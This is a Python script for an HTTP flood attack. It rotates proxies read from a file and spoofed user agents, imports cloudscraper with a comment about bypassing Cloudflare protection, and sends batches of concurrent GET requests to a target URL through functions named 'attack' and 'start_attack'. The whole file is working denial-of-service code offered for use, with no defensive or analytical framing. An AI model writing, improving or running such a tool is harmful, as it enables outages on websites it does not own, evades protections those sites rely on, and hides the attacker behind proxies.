import asyncio
import aiohttp
import random
import cloudscraper

# ✅ Load Proxies from File
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        return []

# ✅ User-Agent List for Rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

# ✅ Create Cloudflare Scraper (Bypass Protection)
def create_scraper():
    return cloudscraper.create_scraper()

# ✅ Attack Function (Uses Proxies & User-Agent Rotation)
async def attack(url, session, proxies):
    proxy = random.choice(proxies) if proxies else None
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": url
    }
    
    try:
        async with session.get(url, headers=headers, proxy=proxy) as response:
            print(f"🔥 Attack Sent! Status: {response.status} via {proxy}")
    except Exception as e:
        print(f"❌ Request Failed: {e}")

# ✅ Start Attack (Multi-threaded)
async def start_attack(url, requests_per_second, total_requests):
    proxies = load_proxies()
    async with aiohttp.ClientSession() as session:
        for _ in range(total_requests // requests_per_second):
            tasks = [attack(url, session, proxies) for _ in range(requests_per_second)]
            await asyncio.gather(*tasks)
